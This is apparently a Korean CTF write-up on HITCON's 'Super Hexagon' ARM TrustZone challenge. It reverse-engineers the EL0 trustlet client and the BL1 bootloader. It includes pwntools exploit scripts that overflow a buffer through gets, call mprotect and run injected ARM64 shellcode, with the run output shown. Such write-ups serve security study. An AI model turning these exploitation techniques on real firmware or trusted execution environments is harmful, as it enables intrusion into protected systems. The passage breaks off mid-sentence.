0x0 00401b90 c0 03 5f d6 ret ************************************************************* * FUNCTION ************************************************************* undefined tc_init_trustlet () undefined w0:1 \u003cRETURN\u003e tc_init_trustlet XREF[2]: Entry Point (*) , load_trustlet:0040019c (c) 00401b74 a8 00 80 d2 mov x8,#0x5 00401b78 08 e0 bf f2 movk x8,#0xff00 , LSL #16 00401b7c 01 00 00 d4 svc 0x0 00401b80 c0 03 5f d6 ret tc_ 접두사가 붙은 함수들은 trustzone과 상호작용하기 위한 함수들로 보인다. 안에 내용들을 보면 일반적인 번호가 아닌 syscall들을 호출하는 것을 확인할 수 있다. TA_Bin은 아마 S_EL0의 코드로 보인다. secure world와 normal world는 서로 world shared memory를 매핑하여 통신하는데, 이를 매핑하는 함수들이 보인다.\nvoid cmd_load(char *buf,int idx,int len) { int iVar1; iVar1 = load_key(idx,buf); if (iVar1 == 0) { printf(\"[%d] =\u003e %s\\n\",(ulong)(uint)idx,buf); } return; } int load_key(int x,char *buf) { byte bVar1; int i; uint uVar2; int iVar3; tci_buf-\u003ecmd = 2; tci_buf-\u003eindex = x; tc_tci_call(tci_handle); if (tci_buf-\u003ecmd == 0) { uVar2 = 0; while( true ) { if (tci_buf-\u003esize \u003c= uVar2) break; bVar1 = *(byte *)((long)\u0026tci_buf[1].cmd + (long)(int)uVar2); buf[(int)(uVar2 \u003c\u003c 1)] = \"0123456789abcdef\"[(int)(uint)(bVar1 \u003e\u003e 4)]; buf[(long)(int)(uVar2 \u003c\u003c 1) + 1] = \"0123456789abcdef\"[(int)(bVar1 \u0026 0xf)]; uVar2 = uVar2 + 1; } buf[tci_buf-\u003esize \u003c\u003c 1] = '\\0'; iVar3 = 0; } else { printf(\"load_key: failed (tci_msg: %s)\\n\",tci_buf + 1); iVar3 = -1; } return iVar3; } void cmd_save(char *buf,int idx,int len) { int iVar1; iVar1 = save_key(idx,buf,len); if (iVar1 == 0) { printf(\"[%d] \u003c= %s\\n\",(ulong)(uint)idx,buf); } return; } int save_key(int x,char *buf,int len) { uint uVar1; int iVar2; int iVar3; int iter; int size; TCI *pTVar2; uVar1 = len / 2; tci_buf-\u003ecmd = 3; tci_buf-\u003eindex = x; pTVar2 = tci_buf; tci_buf-\u003esize = uVar1; for (iter = 0; iter \u003c (int)uVar1; iter = iter + 1) { iVar2 = h2i(buf[iter \u003c\u003c 1]); iVar3 = h2i(buf[(long)(iter \u003c\u003c 1) + 1]); pTVar2-\u003edata[iter] = (char)iVar2 * 16 + (char)iVar3; } pTVar2-\u003edata[(int)uVar1] = '\\0'; tc_tci_call(tci_handle); if (tci_buf-\u003ecmd == 0) { iter = 0; } else { printf(\"save_key: failed (tci_msg: %s)\\n\",tci_buf-\u003edata); iter = -1; } return iter; } tci_buf→cmd와 index를 설정하고 tci_handle을 인자로 tc_tci_call을 호출한다.\n************************************************************* * FUNCTION ************************************************************* undefined tc_tci_call () undefined w0:1 \u003cRETURN\u003e tc_tci_call XREF[3]: Entry Point (*) , load_key:00400324 (c) , save_key:00400490 (c) 00401b94 c8 00 80 d2 mov x8,#0x6 00401b98 08 e0 bf f2 movk x8,#0xff00 , LSL #16 00401b9c 01 00 00 d4 svc 0x0 00401ba0 c0 03 5f d6 ret tci call도 생소한 번호의 시스템 콜을 호출한다.\nvoid run(void) { size_t sVar1; int iVar2; int idx; int cmd; printf(\"cmd\u003e \"); scanf(\"%d\",\u0026cmd); printf(\"index: \"); scanf(\"%d\",\u0026idx); if (cmd == 1) { printf(\"key: \"); scanf(\"%s\",buf); sVar1 = strlen(buf); iVar2 = (int)sVar1; } else { iVar2 = 0; } (*cmdtb[cmd])(buf,idx,iVar2); return; } 취약점 자체는 간단하다.\nint scanf(char *__format,...) { int iVar1; undefined8 in_x1; undefined8 in_x2; undefined8 in_x3; undefined8 in_x4; undefined8 in_x5; undefined8 in_x6; undefined8 in_x7; void *local_100; void *pvStack_f8; void *local_f0; undefined8 uStack_e8; __va_list ap; undefined auStack_40 [8]; undefined8 local_38; undefined8 local_30; undefined8 local_28; undefined8 local_20; undefined8 local_18; undefined8 local_10; undefined8 local_8; ap.__vr_top = auStack_40; ap.__gr_offs = -0x38; ap.__vr_offs = -0x80; ap.__stack = register0x00000008; ap.__gr_top = register0x00000008; local_38 = in_x1; local_30 = in_x2; local_28 = in_x3; local_20 = in_x4; local_18 = in_x5; local_10 = in_x6; local_8 = in_x7; gets(input); local_100 = ap.__stack; pvStack_f8 = ap.__gr_top; uStack_e8 = CONCAT44(ap.__vr_offs,ap.__gr_offs); local_f0 = ap.__vr_top; iVar1 = vsscanf(input,__format,\u0026local_100); return iVar1; } scanf 내부의 cmdtb보다 0x100 바이트 앞에 위치한 input에 대한 bof가 발생한다. 그리고 cmdtb에 대한 oob access가 발생한다.\n----------------------------------------------- Total ----------------------------------------------- [+] PT Entry (Total): 9 [+] PT Entry (merged consecutive pages): 6 -------------------------------------------- Memory map -------------------------------------------- Virtual address start-end Physical address start-end Total size Page size Count Flags 0x0000000000400000-0x0000000000403000 0x000000000002c000-0x000000000002f000 0x3000 0x1000 3 [EL0/R-X EL1/R-- ACCESSED GLOBAL] 0x0000000000412000-0x0000000000413000 0x000000000002f000-0x0000000000030000 0x1000 0x1000 1 [EL0/RW- EL1/RW- ACCESSED GLOBAL] 0x00007ffeffffd000-0x00007ffeffffe000 0x0000000000034000-0x0000000000035000 0x1000 0x1000 1 [EL0/RW- EL1/RW- ACCESSED GLOBAL] 0x00007ffeffffe000-0x00007ffefffff000 0x0000000000033000-0x0000000000034000 0x1000 0x1000 1 [EL0/RW- EL1/RW- ACCESSED GLOBAL] 0x00007ffefffff000-0x00007fff00000000 0x0000000000032000-0x0000000000033000 0x1000 0x1000 1 [EL0/RW- EL1/RW- ACCESSED GLOBAL] 0x00007fff7fffe000-0x00007fff80000000 0x0000000000030000-0x0000000000032000 0x2000 0x1000 2 [EL0/RW- EL1/RW- ACCESSED GLOBAL] -------------------------------------------- $TTBR1_EL1 -------------------------------------------- [+] $TTBR1_EL1: 0x1b000 [+] $TCR_EL1: 0x6080100010 [+] Intermediate Physical Address Size: 32 bits [+] EL1 Kernel Region: 0xffff000000000000 - 0xffffffffffffffff (48 bits) [+] EL1 Kernel Page Size: 4KB (per page) [+] granule_bits: 12 [+] LEVELM1_BIT_RANGE: None [+] LEVEL0_BIT_RANGE: [39, 48] [+] LEVEL1_BIT_RANGE: [30, 39] [+] LEVEL2_BIT_RANGE: [21, 30] [+] LEVEL3_BIT_RANGE: [12, 21] [+] OFFSET_BIT_RANGE: [0, 12] --------------------------------------------- LEVEL -1 --------------------------------------------- ELF 바이너리 자체는 메모리에 그대로 올라가있다. print_flag 함수가 이미 있어서 flag 얻는것 자체는 간단하다. Exploit code (flag) from pwn import * sla = lambda x,y : p.sendlineafter(x,y) sa = lambda x,y : p.sendafter(x,y) context.binary = e = ELF('./super_hexagon/share/_bios.bin.extracted/BC010') p = remote('localhost',6666) payload = b'A'*0b101 + b'\\x00' payload += b'A' * (0xf8-len(payload)) payload += p64(e.sym.mprotect) payload += p64(e.sym.buf) payload += p64(e.sym.print_flag) # cmd = 1 payload += p64(0xdeadbeef)*1 assert b'\\r' not in payload and b'\\x0a' not in payload sla(b'cmd\u003e ', b'1') sla(b'index: ', str(0)) # sz sla(b'key: ', payload) p.interactive() EL1도 exploit 하려면 안정적으로 쉘코드를 실행시킬 수 있어야한다.\n(*cmdtb[cmd])(buf,idx,len); len, idx가 컨트롤 가능하기 때문에 mprotect를 호출해서 권한을 변경할 수 있다.\n\u003e python3 ex.py [+] Opening connection to localhost on port 6666: Done [*] '/mnt/c/Users/msh/Desktop/SuperHexagon/super_hexagon-2044407c141e2a3a49d9fb57b62c73ee/release/super_hexagon/share/_bios.bin.extracted/BC010' Arch: aarch64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) /mnt/c/Users/msh/Desktop/SuperHexagon/super_hexagon-2044407c141e2a3a49d9fb57b62c73ee/release/super_hexagon/ex.py:2: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes sla = lambda x,y : p.sendlineafter(x,y) [*] Paused (press any to continue) [*] Switching to interactive mode ERROR: [VMM] RWX pages are not allowed [*] Got EOF while reading in interactive $ [*] Closed connection to localhost port 6666 mprotect를 호출해서 rwx로 권한을 변경하려고 시도했지만 EL2가 rwx 페이지를 막는다. 그렇다면 처음 입력때 미리 쉘코드를 삽입하고 r-x 로 권한을 변경하고 거기로 점프하면 된다.\nExploit code (code execution) from pwn import * from keystone import * sla = lambda x,y : p.sendlineafter(x,y) sa = lambda x,y : p.sendafter(x,y) context.binary = e = ELF('./super_hexagon/share/_bios.bin.extracted/BC010') ks = Ks(KS_ARCH_ARM64,KS_MODE_LITTLE_ENDIAN) sc_st = 0x7ffeffffd006 shellcode = b'' shellcode += bytes(ks.asm(f'''\\ mov x5, #-1 mov w4, #0x0 mov w3, #0x0 mov w2, #3 mov x1, #0x1000 mov x0, #0x0 mov x8, #0xde svc #0x1337 mov x11, x0 mov w9, #0x0 loop: add x1, x11, x9 mov x8, #0x3f mov x0, #0 mov x2, #0x1 svc #0x1337 add w9, w9, #1 cmp x9, #0x1000 bne loop mov x0, x11 mov x1, #0x1000 mov x2, #5 mov x8, #0xe2 svc #0x1337 blr x11 ''')[0]) assert b'\\r' not in shellcode and b'\\x0a' not in shellcode p = remote('localhost',6666) payload = b'A' * 0x100 payload += p64(0xdeadbeef) payload += p64(e.sym.gets) # cmd = 1 sla(b'cmd\u003e ', b'1') sla(b'index: ', str(0)) sla(b'key: ', payload) sleep(0.1) payload = b'A' * 0b101 + b'\\x00' payload += shellcode p.sendline(payload) sla(b'cmd\u003e ', b'1') sla(b'index: ', str(0x1000)) payload = b'' payload += b'A'*0b101 + b'\\x00' payload += b'A'*(0x100 - len(payload)) payload += p64(0xdeadbeef) payload += p64(e.sym.mprotect) payload += p64(sc_st) sla(b'key: ', payload) sla(b'cmd\u003e ',b'2') pause() sla(b'index: ', str(1)) sleep(0.1) stack_x29_x30 = 0xffffffffc0019bb0 addr = stack_x29_x30+0x10 shellcode = f'''\\ movz x1, #{((addr)\u003e\u003e48)\u00260xffff}, lsl #48 movk x1, #{((addr)\u003e\u003e32)\u00260xffff}, lsl #32 movk x1, #{((addr)\u003e\u003e16)\u00260xffff}, lsl #16 movk x1, #{(addr)\u00260xffff}, lsl #0 mov x0, #0 mov x2, #0x100 mov x8, #0x3f svc #0x1337 ''' pause() payload = bytes(ks.asm(shellcode)[0]) payload += b'\\x41' * (0x1000 - len(payload)) p.send(payload) # 0x7ffeffffd01e p.interactive() 안정적으로 쉘코드를 삽입할 수 있다. 여기 커널에선 read가 1바이트씩 읽는 것으로 구현되므로 직접 1바이트씩 읽어서 저정하도록 만들어야한다.\nReverse engineering BL1 BL1은 flash rom 위에서 돌면서 코드 무결성을 보장한다. qemu의 hitcon 머신은 처음에 간단한 초기화를 진행하고 바로 부팅을 시작한다. arm_load_kernel 코드를 직접 확인해보면, cpu는 처음에 reset을 수행하게 된다.\nhwaddr flashsize = memmap[VIRT_FLASH].size / 2; hwaddr flashbase = memmap[VIRT_FLASH].base; create_one_flash(\"hitcon.flash0\", flashbase, flashsize, bios_name, secure_sysmem); create_one_flash(\"hitcon.flash1\", flashbase + flashsize, flashsize, NULL, sysmem); 여기서 memmap[VIRT_FLASH].base는 0이고 bios.bin을 여기에 로드한다.\nstatic void hitcon_init(MachineState *machine) { ... // prepare boot info bootinfo.ram_size = machine-\u003eram_size; bootinfo.nb_cpus = 1; bootinfo.board_id = -1; bootinfo.firmware_loaded = true; bootinfo.loader_start = memmap[VIRT_MEM].base; bootinfo.kernel_filename = machine-\u003ekernel_filename; bootinfo.kernel_cmdline = machine-\u003ekernel_cmdline; bootinfo.initrd_filename = machine-\u003einitrd_filename; bootinfo.skip_dtb_autoload = true; arm_load_kernel(ARM_CPU(first_cpu), \u0026bootinfo); } void arm_load_kernel(ARMCPU *cpu, MachineState *ms, struct arm_boot_info *info) { CPUState *cs; AddressSpace *as = arm_boot_address_space(cpu, info); int boot_el; CPUARMState *env = \u0026cpu-\u003eenv; int nb_cpus = 0; /* * CPU objects (unlike devices) are not automatically reset on system * reset, so we must always register a handler to do so. If we're * actually loading a kernel, the handler is also responsible for * arranging that we start it correctly. */ for (cs = first_cpu; cs; cs = CPU_NEXT(cs)) { qemu_register_reset(do_cpu_reset, ARM_CPU(cs)); nb_cpus++; } /* * The board code is not supposed to set secure_board_setup unless * running its code in secure mode is actually possible, and KVM * doesn't support secure. */ assert(!(info-\u003esecure_board_setup \u0026\u0026 kvm_enabled())); info-\u003ekernel_filename = ms-\u003ekernel_filename; info-\u003ekernel_cmdline = ms-\u003ekernel_cmdline; info-\u003einitrd_filename = ms-\u003einitrd_filename; info-\u003edtb_filename = ms-\u003edtb; info-\u003edtb_limit = 0; /* Load the kernel. */ if (!info-\u003ekernel_filename || info-\u003efirmware_loaded) { arm_setup_firmware_boot(cpu, info); } else { arm_setup_direct_kernel_boot(cpu, info); } ... } reset시에 호출될 do_reset 함수를 콜백으로 등록하고, rom의 0x0부터 실행을 시작한다. IROM 내부에서 돌아가는 BL0를 에뮬레이션된 부분이라고 생각하면 된다.\n이제 실질적인 부트로더 BL1을 분석한다. 0x0 번지부터 의사코드를 확인해보면 다음과 같다.\nvoid Reset(void) { ulong uVar1; sctlr_el3 = 0x30c50830; InstructionSynchronizationBarrier(); vbar_el3 = 0x2000; InstructionSynchronizationBarrier(); uVar1 = sctlr_el3; sctlr_el3 = uVar1 | 0x100a; InstructionSynchronizationBarrier(); scr_el3 = 0x238; mdcr_el3 = 0x18000; uVar1 = daif; daif = uVar1 \u0026 0xfffffffffffffeff; cptr_el3 = 0; FUN_00001004(DAT_000000b8,DAT_000000c0); FUN_000010f4(DAT_000000c8,PTR_DAT_000000d0,DAT_000000d8); FUN_000010f4(DAT_000000e0,PTR_LAB_000000e8,PTR_LAB_000000e8); FUN_000010f4(DAT_000000f0,PTR_DAT_000000f8,PTR_DAT_00000100); FUN_000010f4(DAT_00000108,PTR_LAB_00000110,PTR_LAB_000000e8); spsel = 0; FUN_00000514(); FUN_000007f4(); FUN_00000fa8(); return; } 위처럼 sctlr_el3 같은 레지스터에 접근하는 것을 볼 수 있다. 시스템 레지스터 뒤에 붙은 접미사는 최소 접근 권한을 뜻한다.\nCPSR structure \u0026 gdbscript 처음에 부팅하고 CPSR 레지스터를 확인하면 현재의 Exception level을 알 수 있다. 위는 CPSR의 구조이다. 이를 참고하여 cpsr을 확인하는 커맨드를 추가하는 gdbscript를 작성했다. 각각의 ELx에 대해서 SP_EL0와 SP_Elx 두 가지 옵션의 전환이 지원된다. 이를 파싱하는 스크립트를 작성했다.\nimport gdb class CPSR(gdb.Command): def __init__(self): super(CPSR, self).__init__(\"cpsr\", gdb.COMMAND_USER) def invoke(self, arg, from_tty): cpsr = (int(gdb.parse_and_eval(\"$cpsr\"))) mode = cpsr \u0026 0b1111 is_thumb = (cpsr \u003e\u003e 4)\u00261 IRQ = (cpsr \u003e\u003e 7)\u00261 FIQ = (cpsr \u003e\u003e 6)\u00261 cond = (cpsr \u003e\u003e 27)\u00260b1111 re = '' if 0b0000 == mode: re += 'EL0t' # SP_EL0 elif 0b0100 == mode: re += 'EL1t' # SP_EL0 elif 0b0101 == mode: re += 'EL1h' # SP_EL1 elif 0b1000 == mode: re += 'EL2t' # SP_EL0 elif 0b1001 == mode: re += 'EL2h' # SP_EL2 elif 0b1100 == mode: re += 'EL3t' # SP_EL0 elif 0b1101 == mode: re += 'EL3h' # SP_EL3 else: re += 'UNK' re += '| ' if IRQ: re += 'IRQ_MASKED | ' elif FIQ: re += 'FIQ_MASKED | ' if is_thumb: re += 'THUMB_MODE | ' re += f'COND_{hex(cond)[2:]}' print(re) CPSR() gdb에 로드하고 0x0 번지부터 cpsr의 값을 확인해보면 다음과 같다.\ngef\u003e cpsr EL3h| FIQ_MASKED | COND_8 초기 부팅시에 코드는 EL3 코드라는 것을 알 수 있다.\nSCTLR_ELx structure 초기에 EL3로 부팅을 시작하고, 이때 virtual memory system이 활성화 되었는지 확인해야한다. M bit를 확인하면 된다. 앞서 arm manual을 정리하면서 관련 내용을 다뤘다. arm 프로세서는 power up시에 cold reset이 수행된다. 여기선 warm reset시 M bit가 0으로 세팅된다고 하지만, 앞서 정리한 메뉴얼에선 warm reset에서 reset되는 필드는 모두 cold reset에서도 reset된다고 설명했었다. 그렇기에 SCTLR_EL3.M bit는 0으로 IMPLEMENTATION DEFINED 값이다. 실제로도 0으로 세팅되어있는 것을 볼 수 있다. 0x0 번지부터 실행될 때에는 당연하지만 가상 주소가 꺼져있음을 알 수 있다.\nIdentifying exception handlers VBAR_ELx structure exception이 일어나면 exception vector에 등록된 handler가 호출된다.\nException vector structure 0x80 align 되어있다.\n00000010 80 ff 00 10 adr x0,0x2000 00000014 00 c0 1e d5 msr vbar_el3 ,x0 00000018 df 3f 03 d5 isb 이제 exception vector가 어떻게 생겼는지 알고 있다.\n+#define RAMLIMIT_GB 3 +#define RAMLIMIT_BYTES (RAMLIMIT_GB * 1024ULL * 1024 * 1024) +static const MemMapEntry memmap[] = { + /* Space up to 0x8000000 is reserved for a boot ROM */ + [VIRT_FLASH] = { 0, 0x08000000 }, + [VIRT_CPUPERIPHS] = { 0x08000000, 0x00020000 }, + [VIRT_UART] = { 0x09000000, 0x00001000 }, + [VIRT_SECURE_MEM] = { 0x0e000000, 0x01000000 }, + [VIRT_MEM] = { 0x40000000, RAMLIMIT_BYTES }, +}; 앞서 물리 메모리 레이아웃을 patch 파일을 통해 식별했다. VIRT_FLASH 부터 적재되었고, phyiscal address를 쓰니 0x2000 그대로 상수값대로 접근하면 될 것이다.\nLAB_00002000 XREF[1]: FUN_000b8244:000b8344 (*) 00002000 00 00 80 d2 mov x0,#0x0 00002004 79 fb ff 97 bl FUN_00000de8 undefined FUN_00000de8() 00002008 76 fb ff 97 bl FUN_00000de0 undefined FUN_00000de0() 0000200c 00 00 00 00 udf 0x0 00002010 00 00 00 db[112] 00 00 00 00 00 00 00002080 20 00 80 d2 mov x0,#0x1 00002084 59 fb ff 97 bl FUN_00000de8 undefined FUN_00000de8() 00002088 56 fb ff 97 bl FUN_00000de0 undefined FUN_00000de0() 0000208c 00 00 00 00 udf 0x0 00002090 00 00 00 ??[112] 00 00 00 00 00 00 00002100 40 00 80 d2 mov x0,#0x2 00002104 39 fb ff 97 bl FUN_00000de8 undefined FUN_00000de8() 00002108 36 fb ff 97 bl FUN_00000de0 undefined FUN_00000de0() 0000210c 00 00 00 00 udf 0x0 00002110 00 00 00 ??[112] 00 00 00 00 00 00 00002180 60 00 80 d2 mov x0,#0x3 00002184 19 fb ff 97 bl FUN_00000de8 undefined FUN_00000de8() 00002188 16 fb ff 97 bl FUN_00000de0 undefined FUN_00000de0() 0000218c 00 00 00 00 udf 0x0 00002190 00 00 00 ??[112] 00 00 00 00 00 00 00002200 80 00 80 d2 mov x0,#0x4 00002204 f9 fa ff 97 bl FUN_00000de8 undefined FUN_00000de8() 00002208 f6 fa ff 97 bl FUN_00000de0 undefined FUN_00000de0() 0000220c 00 00 00 00 udf 0x0 00002210 00 00 00 ??[112] 00 00 00 00 00 00 00002280 a0 00 80 d2 mov x0,#0x5 00002284 d9 fa ff 97 bl FUN_00000de8 undefined FUN_00000de8() 00002288 d6 fa ff 97 bl FUN_00000de0 undefined FUN_00000de0() 0000228c 00 00 00 00 udf 0x0 00002290 00 00 00 ??[112] 00 00 00 00 00 00 00002300 c0 00 80 d2 mov x0,#0x6 00002304 b9 fa ff 97 bl FUN_00000de8 undefined FUN_00000de8() 00002308 b6 fa ff 97 bl FUN_00000de0 undefined FUN_00000de0() 0000230c 00 00 00 00 udf 0x0 00002310 00 00 00 ??[112] 00 00 00 00 00 00 00002380 e0 00 80 d2 mov x0,#0x7 00002384 99 fa ff 97 bl FUN_00000de8 undefined FUN_00000de8() 00002388 96 fa ff 97 bl FUN_00000de0 undefined FUN_00000de0() 0000238c 00 00 00 00 udf 0x0 00002390 00 00 00 ??[112] 00 00 00 00 00 00 00002400 ff 44 03 d5 msr DAIFClr,#0x4 00002404 fe 7b 00 f9 str x30 ,[sp, #0xf0 ] 00002408 1e 52 3e d5 mrs x30 ,esr_el3 0000240c de 7f 5a d3 ubfx x30 ,x30 ,#0x1a ,#0x6 00002410 df 5f 00 f1 cmp x30 ,#0x17 00002414 61 1f 00 54 b.ne LAB_00002800 00002418 fd 00 00 14 b LAB_0000280c 0000241c 00 00 00 ??[100] 00 00 00 00 00 00 00002480 20 01 80 d2 mov x0,#0x9 00002484 59 fa ff 97 bl FUN_00000de8 undefined FUN_00000de8() 00002488 56 fa ff 97 bl FUN_00000de0 undefined FUN_00000de0() 0000248c 00 00 00 00 udf 0x0 00002490 00 00 00 ??[112] 00 00 00 00 00 00 00002500 40 01 80 d2 mov x0,#0xa 00002504 39 fa ff 97 bl FUN_00000de8 undefined FUN_00000de8() 00002508 36 fa ff 97 bl FUN_00000de0 undefined FUN_00000de0() 0000250c 00 00 00 00 udf 0x0 00002510 00 00 00 ??[112] 00 00 00 00 00 00 00002580 60 01 80 d2 mov x0,#0xb 00002584 19 fa ff 97 bl FUN_00000de8 undefined FUN_00000de8() 00002588 16 fa ff 97 bl FUN_00000de0 undefined FUN_00000de0() 0000258c 00 00 00 00 udf 0x0 00002590 00 00 00 ??[112] 00 00 00 00 00 00 00002600 ff 44 03 d5 msr DAIFClr,#0x4 00002604 fe 7b 00 f9 str x30 ,[sp, #0xf0 ] 00002608 1e 52 3e d5 mrs x30 ,esr_el3 0000260c de 7f 5a d3 ubfx x30 ,x30 ,#0x1a ,#0x6 00002610 df 4f 00 f1 cmp x30 ,#0x13 00002614 61 0f 00 54 b.ne LAB_00002800 00002618 7d 00 00 14 b LAB_0000280c ARRAY_0000261c[52] XREF[0,2]: 000bc070 (*) , 000bc078 (*) 0000261c 00 00 00 ??[100] 00 00 00 00 00 00 00002680 a0 01 80 d2 mov x0,#0xd 00002684 d9 f9 ff 97 bl FUN_00000de8 undefined FUN_00000de8() 00002688 d6 f9 ff 97 bl FUN_00000de0 undefined FUN_00000de0() 0000268c 00 00 00 00 udf 0x0 00002690 00 00 00 ??[112] 00 00 00 00 00 00 00002700 c0 01 80 d2 mov x0,#0xe 00002704 b9 f9 ff 97 bl FUN_00000de8 undefined FUN_00000de8() 00002708 b6 f9 ff 97 bl FUN_00000de0 undefined FUN_00000de0() 0000270c 00 00 00 00 udf 0x0 00002710 00 00 00 ??[112] 00 00 00 00 00 00 00002780 e0 01 80 d2 mov x0,#0xf 00002784 99 f9 ff 97 bl FUN_00000de8 undefined FUN_00000de8() 00002788 96 f9 ff 97 bl FUN_00000de0 undefined FUN_00000de0() 0000278c 00 00 00 00 udf 0x0 00002790 00 00 00 ??[112] 00 00 00 00 00 00 LAB_00002800 XREF[2]: 00002414 (j) , 00002614 (j) 00002800 00 01 80 d2 mov x0,#0x8 00002804 79 f9 ff 97 bl FUN_00000de8 undefined FUN_00000de8() 00002808 76 f9 ff 97 bl FUN_00000de0 undefined FUN_00000de0() LAB_0000280c XREF[2]: 00002418 (j) , 00002618 (j) 0000280c c0 f9 ff 97 bl FUN_00000f0c undefined FUN_00000f0c(undefined 00002810 e5 03 1f aa mov x5,xzr 00002814 e6 03 00 91 mov x6,sp 00002818 cc 88 40 f9 ldr x12 ,[x6, #0x110 ] 0000281c bf 40 00 d5 msr PState.SP,#0x0 00002820 9f 01 00 91 mov sp,x12 00002824 10 40 3e d5 mrs x16 ,spsr_el3 00002828 31 40 3e d5 mrs x17 ,elr_el3 0000282c 12 11 3e d5 mrs x18 ,scr_el3 00002830 d0 c4 11 a9 stp x16 ,x17 ,[x6, #0x118 ] 00002834 d2 80 00 f9 str x18 ,[x6, #0x100 ] 00002838 47 02 40 b3 bfxil x7,x18 ,#0x0 ,#0x1 0000283c 06 f8 ff 97 bl FUN_00000854 undefined FUN_00000854() 00002840 da f9 ff 17 b FUN_00000fa8 undefined FUN_00000fa8(undefined -- Flow Override: CALL_RETURN (CALL_TERMINATOR) ARRAY_00002844[12] XREF[3,2]: FUN_0000055c:00000578 (*) , ARRAY_00002844 FUN_0000055c:00000654 (*) , 00001950 (*) , Reset:00000060 (*) , 000000d0 (*) 00002844 00 00 00 ??[112] 00 00 00 00 00 00 ghidra를 통해 적당히 0x80씩 더해가며 디스어셈블해보니 exception handler를 식별할 수 있었다. 대충 어떤식으로 분석을 시도해야하는지 알게 되었다.\n그런데 지금 취약점을 찾아서 익스플로잇해야하는 부분은 EL3가 아닌 EL1이다. 일단 EL3의 exception vector를 찾았으니 나중을 위해 남겨두고 다시 부트로더를 분석해야한다.\nvoid Reset(void) { ulong uVar1; sctlr_el3 = 0x30c50830; InstructionSynchronizationBarrier(); vbar_el3 = 0x2000; InstructionSynchronizationBarrier(); uVar1 = sctlr_el3; sctlr_el3 = uVar1 | 0x100a; InstructionSynchronizationBarrier(); scr_el3 = 0x238; mdcr_el3 = 0x18000; uVar1 = daif; daif = uVar1 \u0026 0xfffffffffffffeff; cptr_el3 = 0; FUN_00001004(DAT_000000b8,DAT_000000c0); FUN_000010f4(DAT_000000c8,PTR_DAT_000000d0,DAT_000000d8); FUN_000010f4(DAT_000000e0,PTR_LAB_000000e8,PTR_LAB_000000e8); FUN_000010f4(DAT_000000f0,PTR_DAT_000000f8,PTR_DAT_00000100); FUN_000010f4(DAT_00000108,PTR_LAB_00000110,PTR_LAB_000000e8); spsel = 0; FUN_00000514(); FUN_000007f4(); FUN_00000fa8(); return; } 대강 어떤 동작을 하고 있는지 이제 이해할 수 있다.\nvoid FUN_00001004(char *param_1,char *param_2) { undefined8 *puVar1; undefined8 *puVar2; undefined8 *puVar3; puVar2 = (undefined8 *)(param_1 + (long)param_2); if (((ulong)param_1 \u0026 0xf) != 0) { puVar1 = (undefined8 *)(((ulong)param_1 | 0xf) + 1); if ((((ulong)param_1 | 0xf) == 0xffffffffffffffff) || (puVar3 = (undefined8 *)param_1, puVar2 \u003c= puVar1)) goto joined_r0x000010b4; do { param_1 = (char *)((long)puVar3 + 1); *(undefined *)puVar3 = 0; puVar3 = (undefined8 *)param_1; } while ((undefined8 *)param_1 != puVar1); } for (; param_1 \u003c (undefined8 *)((ulong)puVar2 \u0026 0xfffffffffffffff0); param_1 = (char *)((long)param_1 + 0x10)) { *(undefined8 *)param_1 = 0; *(undefined8 *)((long)param_1 + 8) = 0; } joined_r0x000010b4: for (; (undefined8 *)param_1 != puVar2; param_1 = (char *)((long)param_1 + 1)) { *param_1 = 0; } return; } 메모리를 0으로 초기화하는 작업을 수행한다.\nvoid FUN_000010f4(char *param_1,char *param_2,ulong size) { undefined8 uVar1; for (; 0xf \u003c size; size = size - 0x10) { uVar1 = *(undefined8 *)((long)param_2 + 8); *(undefined8 *)param_1 = *(undefined8 *)param_2; *(undefined8 *)((long)param_1 + 8) = uVar1; param_1 = (char *)((long)param_1 + 0x10); param_2 = (char *)((long)param_2 + 0x10); } do { if (size == 0) { return; } *param_1 = *param_2; size = size - 1; param_1 = (char *)((long)param_1 + 1); param_2 = (char *)((long)param_2 + 1); } while (size != 0); return; } 두 번째는 단순히 복사하는 함수다.\n정리하면 다음과 같이 표현할 수 있다.\nmemset(0xE002000, 0, 0x202000) memcpy(0xE000000, 0x002850, 0x68) memcpy(0x40100000, 0x10000, 0x10000) memcpy(0xE400000, 0x20000, 0x90000) memcpy(0x40000000, 0xb0000, 0x10000) EL3 코드는 코드 무결성을 위해 코드는 DRAM에 올라가지 않는다. FLASH에서 동작한다.\n0x10000를 확인했더니 다음과 같은 코드가 나왔다.\n************************************************************* * FUNCTION ************************************************************* undefined FUN_00010000 () undefined w0:1 \u003cRETURN\u003e FUN_00010000 XREF[4]: Reset:00000070 (*) , Reset:00000074 (*) , Reset:00000094 (*) , 000bc080 (*) 00010000 00 c0 00 10 adr x0,0x11800 00010004 00 c0 1c d5 msr vbar_el2 ,x0 00010008 df 3f 03 d5 isb 0001000c 60 01 00 58 ldr x0,DAT_00010038 00010010 81 01 00 58 ldr x1=\u003eDAT_0000d000 ,PTR_DAT_00010040 = 0000d000 00010014 13 02 00 94 bl FUN_00010860 undefined FUN_00010860() 00010018 bf 40 00 d5 msr PState.SP,#0x0 0001001c 60 01 00 58 ldr x0,DAT_00010048 = 0000000040104040h 00010020 1f 00 00 91 mov sp,x0 00010024 0b 00 00 94 bl FUN_00010050 undefined FUN_00010050() 00010028 e2 00 00 94 bl FUN_000103b0 undefined FUN_000103b0() 0001002c 65 00 00 94 bl FUN_000101c0 undefined FUN_000101c0() 00010030 fa 01 00 94 bl FUN_00010818 undefined FUN_00010818(undefined adr로 상대 주소를 만들어낸다. 이는 EL2의 코드이다. 물리메모리 맵에 따라 적재된 이후 실행되었기 때문에 이러한 주소를 가지게 된다. 여기서 EL1의 exception vector 주소는 가상 주소로 설정되어있다.\n0xb0000에서 EL1을 확인할 수 있었다.\nvoid UndefinedFunction_000b0000(void) { ulong uVar1; ttbr0_el1 = 0xb1000; ttbr1_el1 = 0xb4000; tcr_el1 = 0x6080100010; InstructionSynchronizationBarrier(); uVar1 = sctlr_el1; sctlr_el1 = uVar1 | 1; InstructionSynchronizationBarrier(); /* WARNING: Treating indirect jump as call */ (*(code *)\u0026LAB_ffffffffc00b8000)(); return; } 이런식으로 virtual memory system을 활성화하고 점프한다. EL1까지 찾았으니 소거법으로 마지막 남은 0x20000은 S.EL1에 해당할 것이다. BL1 부팅을 좀 더 확인해보면, EL3에서 eret으로 EL2로 내려가서 부팅을 마저 수행한다. 그리고 IPA 0x0부터 EL1을 마저 부팅하게 되며 이때 TEE OS를 